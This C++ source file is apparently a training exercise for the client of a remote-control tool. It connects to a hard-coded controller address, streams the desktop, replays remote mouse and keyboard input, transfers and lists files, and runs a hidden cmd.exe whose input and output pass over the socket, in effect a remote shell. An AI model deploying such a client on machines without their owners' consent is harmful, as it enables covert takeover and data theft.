﻿//Client.cpp 实现文件
#include <string>
#include <iostream>

#include "CRemoteControl.h"
#include "CSocket.h"
#include <ranges>
#include <algorithm>

HANDLE g_hParentReadPipe = nullptr;
HANDLE g_hParentWritePipe = nullptr;

HANDLE g_hChildReadPipe = nullptr;
HANDLE g_hChildWritePipe = nullptr;

HANDLE g_hProCmd = nullptr;

bool g_bIsHaveCmd = false;

void StartCmd(CSocket* pSock, char* buf, ULONG nlen);

mutex g_mtThread;
bool g_bStartThread = false;

using namespace std;

// 辅助函数：规范化路径（转换为绝对路径并统一分隔符）
std::string NormalizePath(const std::string& path) {
    char buffer[MAX_PATH] = { 0 };
    if (GetFullPathNameA(path.c_str(), MAX_PATH, buffer, nullptr) == 0) {
        return "";
    }

    std::string normalized(buffer);
    // 统一替换为反斜杠
    std::replace(normalized.begin(), normalized.end(), '/', '\\');

    // 移除末尾的反斜杠（根目录除外）
    if (normalized.length() > 3 && normalized.back() == '\\') {
        normalized.pop_back();
    }

    return normalized;
}

// 辅助函数：验证路径是否合法
bool IsValidPath(const std::string& path) {
    // 1. 检查是否为空
    if (path.empty()) {
        return false;
    }

    // 2. 检查是否为盘符路径（如C:\）
    if (path.length() >= 3 &&
        isalpha(path[0]) &&
        path[1] == ':' &&
        path[2] == '\\') {
        // 盘符路径 - 检查盘符是否存在
        DWORD drives = GetLogicalDrives();
        int drive = toupper(path[0]) - 'A';
        return (drives & (1 << drive)) != 0;
    }

    // 3. 检查是否包含非法字符或序列
    const char* invalidChars = "<>:\"|?*";
    if (path.find_first_of(invalidChars) != std::string::npos) {
        return false;
    }

    // 4. 检查是否尝试访问上级目录
    if (path.find("..\\") != std::string::npos ||
        path.find("\\..") != std::string::npos) {
        return false;
    }

    // 5. 检查是否尝试访问系统关键目录（可选）
    const char* restricted[] = {
        "windows\\", "system32\\", "program files\\",
        "program files (x86)\\", "boot\\", "etc\\"
    };

    std::string lowerPath = path;
    std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);

    for (const char* dir : restricted) {
        if (lowerPath.find(dir) != std::string::npos) {
            return false;
        }
    }

    return true;
}


int main()
{
    CSocket sock("0.0.0.0", 0, 0, false);
    sock.Connect("192.168.1.2", 0x9530, 0x9531);

    // 线程
    thread th([&]() {
        while (true)
        {
            // 发送桌面
            g_mtThread.lock();
            if (g_bStartThread)
            {
                CRemoteControl::SendDesktop(&sock);
                g_bStartThread = false;
            }
            g_mtThread.unlock();
        }
        });
    th.detach();

    // 线程
    thread th1([&]() {
        // 开启文件下载
        CRemoteControl::DownloadFile(&sock);
        });
    th1.detach();



    // 响应消息
    while (true)
    {
        if (!sock.m_quRecvData->empty())
        {
            sock.m_mtRecvData.lock();
            PACKAGE* pkg = sock.m_quRecvData->front();
            sock.m_quRecvData->pop();
            sock.m_mtRecvData.unlock();

            switch (pkg->m_pt)
            {
            case PT_SCREEN:
            {
                // 发送桌面
                g_mtThread.lock();
                g_bStartThread = true;
                g_mtThread.unlock();
                break;
            }
            case PT_MOUSEMSG:
            {
                // 响应鼠标消息
                MOUSEMSG* pmMsg = (MOUSEMSG*)pkg->m_wsabuf.buf;
                POINT pt(pmMsg->m_point);
                SetCursorPos(pt.x, pt.y);

                switch (pmMsg->m_Msg)
                {
                case WM_LBUTTONDOWN:
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    //Logs("左键按下 x:%d y:%d", pt.x, pt.y);
                    break;
                }
                case WM_LBUTTONUP:
                {
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    //Logs("左键弹起 x:%d y:%d", pt.x, pt.y);
                    break;
                }
                case WM_RBUTTONDOWN:
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    //Logs("右键按下 x:%d y:%d", pt.x, pt.y);
                    break;
                }
                case WM_RBUTTONUP:
                {
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    //Logs("右键弹起 x:%d y:%d", pt.x, pt.y);
                    break;
                }
                case WM_LBUTTONDBLCLK:
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    //Logs("左键双击 x:%d y:%d", pt.x, pt.y);
                }
                case WM_MOUSEMOVE:
                {
                    mouse_event(MOUSEEVENTF_MOVE, 0, 0, 0, 0);
                    //Logs("鼠标移动 x:%d y:%d", pt.x, pt.y);
                    break;
                }
                case WM_MOUSEWHEEL:
                {
                    short zDelta = *(short*)(pmMsg + 1);
                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, zDelta, 0);
                    //Logs("鼠标滚轮 %d x:%d y:%d", zDelta, pt.x, pt.y);
                    break;
                }
                }
                break;
            }
            case PT_KEYBOARD:
            {
                // 响应键盘消息
                MSG* pMsg = (MSG*)pkg->m_wsabuf.buf;
                switch (pMsg->message)
                {
                case WM_KEYDOWN:
                {
                    keybd_event(pMsg->wParam, pMsg->lParam & 0xff, KEYEVENTF_EXTENDEDKEY, 0);
                    break;
                }
                case WM_KEYUP:
                {
                    keybd_event(pMsg->wParam, pMsg->lParam & 0xff, KEYEVENTF_KEYUP | KEYEVENTF_EXTENDEDKEY, 0);
                    break;
                }
                //系统按键 如ALT SHIFT
                case WM_SYSKEYDOWN:
                {
                    keybd_event(pMsg->wParam, pMsg->lParam & 0xff, KEYEVENTF_EXTENDEDKEY, 0);
                    break;
                }
                case WM_SYSKEYUP:
                {
                    keybd_event(pMsg->wParam, pMsg->lParam & 0xff, KEYEVENTF_KEYUP | KEYEVENTF_EXTENDEDKEY, 0);
                    break;
                }
                }
                break;
            }
            case PT_CMD:
            {
                // 响应CMD
                StartCmd(&sock, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                break;
            }
            case PT_UPFILE:
            {
                // 上传文件
                CRemoteControl::UploadFile(&sock, sock.m_siDistance, sock.m_siFileDistance, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                break;
            }
            case PT_DOWNFILE:
            {
                // 让服务器把文件发过来
                char* p = new char[pkg->m_wsabuf.len];
                memcpy(p, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                sock.SendData(PT_UPFILE, sock.m_siDistance, p, (pkg->m_wsabuf.len));
                break;
            }
            case PT_TRANSFERSTART:
            {
                // 传输开始、得到文件名文件大小
                FILEINFO fi(pkg->m_wsabuf.len, pkg->m_wsabuf.buf);
                string strFileName(fi.m_szFileName, fi.m_nFileNameLen);
                sock.m_mtFileInfo.lock();
                get<0>((*sock.m_mpFileInfo)[strFileName]) = fi.m_liFileSize;
                get<1>((*sock.m_mpFileInfo)[strFileName]) = {0};
                sock.m_mtFileInfo.unlock();
                // 并将信息返回给服务器
                char* p = new char[pkg->m_wsabuf.len];
                memcpy(p, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                sock.SendData(PT_TRANSFERSTART, sock.m_si, p, pkg->m_wsabuf.len);
                break;
            }
            case PT_TRANSFER:
            {
                // 传输进度
                FILEINFO fi(pkg->m_wsabuf.len, pkg->m_wsabuf.buf);
                string strFileName(fi.m_szFileName, fi.m_nFileNameLen);
                sock.m_mtFileInfo.lock();
                get<1>((*sock.m_mpFileInfo)[strFileName]) = fi.m_liFileSize;
                sock.m_mtFileInfo.unlock();
                // 并将信息返回给服务器
                char* p = new char[pkg->m_wsabuf.len];
                memcpy(p, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                sock.SendData(PT_TRANSFER, sock.m_si, p, pkg->m_wsabuf.len);
                break;
            }
            case PT_TRANSFEREND:
            {
                // 传输结束
                FILEINFO fi(pkg->m_wsabuf.len, pkg->m_wsabuf.buf);
                string strFileName(fi.m_szFileName, fi.m_nFileNameLen);
                sock.m_mtFileInfo.lock();
                get<1>((*sock.m_mpFileInfo)[strFileName]) = fi.m_liFileSize;
                sock.m_mtFileInfo.unlock();
                // 并将信息返回给服务器
                char* p = new char[pkg->m_wsabuf.len];
                memcpy(p, pkg->m_wsabuf.buf, pkg->m_wsabuf.len);
                sock.SendData(PT_TRANSFEREND, sock.m_si, p, pkg->m_wsabuf.len);
                break;
            }
            case PT_FILECMD:
            {
                Logs("收到 PT_FILECMD 包，长度=%d", pkg->m_wsabuf.len);

                if (pkg->m_wsabuf.len < sizeof(FILECMD_PKG))
                {
                    Logs("包长度不足，忽略");
                    break;
                }

                FILECMD_PKG* pCmd = (FILECMD_PKG*)pkg->m_wsabuf.buf;
                Logs("命令ID=%d，参数长度=%zu", pCmd->m_cmdID, pCmd->m_paramLen);

                switch (pCmd->m_cmdID)
                {
                case 1: // 获取盘符请求
                {
                    char szDrives[256] = { 0 };
                    DWORD dwLen = GetLogicalDriveStringsA(sizeof(szDrives), szDrives);
                    if (dwLen == 0)
                    {
                        Logs("[51asm]GetLogicalDriveStringsA 失败，错误码=%d", GetLastError());
                        sock.SendData(PT_FILECMD, pkg->m_si, nullptr, 0);
                        break;
                    }

                    Logs("[51asm]获取盘符成功，长度=%d，准备发送回包", dwLen);

                    // 先构造 FILECMD_PKG + 数据
                    size_t totalSize = sizeof(FILECMD_PKG) + dwLen;
                    char* buf = new char[totalSize];
                    FILECMD_PKG* pReply = (FILECMD_PKG*)buf;
                    pReply->m_pt = PT_FILECMD;
                    pReply->m_si = pkg->m_si;  // 原发来请求的控制端地址
                    pReply->m_cmdID = 1;
                    pReply->m_paramLen = 0;

                    // 把盘符内容拷贝进去
                    memcpy(buf + sizeof(FILECMD_PKG), szDrives, dwLen);


                    // 发送完整数据包
                    sock.SendData(PT_FILECMD, pkg->m_si, buf, totalSize);

                    // 遍历打印所有盘符
                    char* p = szDrives;
                    while (*p)
                    {
                        Logs("[51asm]盘符: %s", p);
                        p += strlen(p) + 1;  // 移动到下一个字符串
                    }
                    
                    Logs("[51asm]回包已发送");
                    break;

                }

                case 2:
                {
                    Logs("[51asm]收到列目录命令");

                    // 1. 获取并验证路径
                    char* pszPath = (char*)(pCmd + 1);
                    if (pszPath == nullptr || pCmd->m_paramLen == 0) {
                        Logs("[51asm]参数路径为空，无法列目录");
                        sock.SendData(PT_FILECMD, pkg->m_si, nullptr, 0);
                        break;
                    }

                    std::string strPath(pszPath, pCmd->m_paramLen);

                    // 规范化路径
                    std::string normalizedPath = NormalizePath(strPath);
                    if (normalizedPath.empty()) {
                        Logs("[51asm]路径规范化失败: %s", strPath.c_str());
                        sock.SendData(PT_FILECMD, pkg->m_si, nullptr, 0);
                        break;
                    }

                    // 验证路径合法性
                    if (!IsValidPath(normalizedPath)) {
                        Logs("[51asm]非法路径: %s", normalizedPath.c_str());
                        sock.SendData(PT_FILECMD, pkg->m_si, nullptr, 0);
                        break;
                    }

                    Logs("[51asm]请求列出目录：%s", normalizedPath.c_str());

                    // 2. 拼接通配符
                    std::string searchPath = normalizedPath + "\\*";
                    WIN32_FIND_DATAA findData;
                    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

                    if (hFind == INVALID_HANDLE_VALUE) {
                        Logs("[51asm]FindFirstFileA 失败，路径=%s", searchPath.c_str());
                        GetMyError("FindFirstFileA");
                        sock.SendData(PT_FILECMD, pkg->m_si, nullptr, 0);
                        break;
                    }

                    // 3. 构造目录项：显示名、完整路径
                    std::vector<std::pair<std::string, std::string>> vecEntries;

                    do
                    {
                        std::string name = findData.cFileName;

                        if (name == "." || name == "..")
                            continue;

                        std::string displayName;
                        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                            displayName =  name;
                        else
                            displayName =  name;

                        std::string fullPath = strPath + "\\" + name;
                        vecEntries.emplace_back(displayName, fullPath);

                    } while (FindNextFileA(hFind, &findData));

                    FindClose(hFind);

                    // 4. 打包回包内容
                    size_t totalLen = sizeof(FILECMD_PKG);
                    for (size_t i = 0; i < vecEntries.size(); ++i)
                    {
                        totalLen += vecEntries[i].first.size() + 1;  // name
                        totalLen += vecEntries[i].second.size() + 1; // path
                    }


                    char* buf = new char[totalLen];
                    FILECMD_PKG* pReply = (FILECMD_PKG*)buf;
                    pReply->m_pt = PT_FILECMD;
                    pReply->m_si = pkg->m_si;
                    pReply->m_cmdID = 2;
                    pReply->m_paramLen = 0;

                    char* p = buf + sizeof(FILECMD_PKG);
                    for (size_t i = 0; i < vecEntries.size(); ++i)
                    {
                        const std::string& name = vecEntries[i].first;
                        const std::string& path = vecEntries[i].second;

                        memcpy(p, name.c_str(), name.size());
                        p += name.size();
                        *p++ = '\0';

                        memcpy(p, path.c_str(), path.size());
                        p += path.size();
                        *p++ = '\0';
                    }


                    // 5. 发送回包
                    sock.SendData(PT_FILECMD, pkg->m_si, buf, totalLen);
                    Logs("[51asm]目录数据发送完毕，项数=%zu", vecEntries.size());

                    break;
                }

                default:
                    Logs("收到未知命令ID=%d，忽略", pCmd->m_cmdID);
                    break;
                }
                break;
            }

            }
            if (pkg != nullptr)
            {
                delete pkg;
                pkg = nullptr;
            }
        }
        // 获取CMD消息
        DWORD dwAvail = 0;
        bool bRet = PeekNamedPipe(g_hParentReadPipe, NULL, NULL, NULL, &dwAvail, NULL);
        if (bRet && dwAvail > 0)
        {
            char* pBuffer = new char[dwAvail] {};
            DWORD dwNumWrite = 0;
            bRet = ReadFile(g_hParentReadPipe, pBuffer, dwAvail, &dwNumWrite, NULL);
            if (bRet)
            {
                sock.SendData(PT_CMD, sock.m_siDistance, pBuffer, dwAvail);
            }
        }
    }

    return 0;
}

void StartCmd(CSocket* pSock, char* buf, ULONG nlen)
{
    // 开启CMD ，使用管道与CMD进程通信
    if (!g_bIsHaveCmd)
    {
        // 创建管道
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        BOOL bRet = CreatePipe(&g_hParentReadPipe, &g_hChildWritePipe, &sa, 0x10000000);
        if (!bRet)
        {
            string strErr = GetMyError("ERROR CreatePipe");
            char* pBuffer = new char[strErr.size()] {};
            memcpy(pBuffer, strErr.c_str(), strErr.size());
            pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
            return;
        }
        bRet = CreatePipe(&g_hChildReadPipe, &g_hParentWritePipe, &sa, 0x10000000);
        if (!bRet)
        {
            string strErr = GetMyError("ERROR CreatePipe");
            char* pBuffer = new char[strErr.size()] {};
            memcpy(pBuffer, strErr.c_str(), strErr.size());
            pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
            return;
        }

        // 启动cmd
        // 修改启动信息
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdInput = g_hChildReadPipe;
        si.hStdOutput = g_hChildWritePipe;
        si.hStdError = g_hChildWritePipe;
        PROCESS_INFORMATION pi = { 0 };
        bRet = CreateProcess(NULL, (char*)"cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (!bRet)
        {
            string strErr = GetMyError("ERROR CreatePipe");
            char* pBuffer = new char[strErr.size()] {};
            memcpy(pBuffer, strErr.c_str(), strErr.size());
            pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
            return;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        g_bIsHaveCmd = true;
    }

    // 给CMD发送消息
    DWORD dwNumRead = 0;
    bool bRet = WriteFile(g_hParentWritePipe, buf, nlen, &dwNumRead, nullptr);
    if (!bRet)
    {
        string strErr = GetMyError("ERROR write pipe failed");
        char* pBuffer = new char[strErr.size()] {};
        memcpy(pBuffer, strErr.c_str(), strErr.size());
        pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
        TerminateProcess(g_hProCmd, 0);
        g_bIsHaveCmd = false;
        return;
    }

    // 获取CMD消息
    DWORD dwAvail = 0;
    bRet = PeekNamedPipe(g_hParentReadPipe, NULL, NULL, NULL, &dwAvail, NULL);
    if (!bRet)
    {
        string strErr = GetMyError("ERROR peek pipe failed");
        char* pBuffer = new char[strErr.size()] {};
        memcpy(pBuffer, strErr.c_str(), strErr.size());
        pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
        TerminateProcess(g_hProCmd, 0);
        g_bIsHaveCmd = false;
        return;
    }
    if (dwAvail > 0)
    {
        char* pBuffer = new char[dwAvail] {};
        DWORD dwNumWrite = 0;
        bRet = ReadFile(g_hParentReadPipe, pBuffer, dwAvail, &dwNumWrite, NULL);
        if (!bRet)
        {
            string strErr = GetMyError("ERROR peek pipe failed");
            char* pBuffer = new char[strErr.size()] {};
            memcpy(pBuffer, strErr.c_str(), strErr.size());
            pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, strErr.size());
            TerminateProcess(g_hProCmd, 0);
            g_bIsHaveCmd = false;
            return;
        }
        pSock->SendData(PT_CMD, pSock->m_siDistance, pBuffer, dwAvail);
    }
}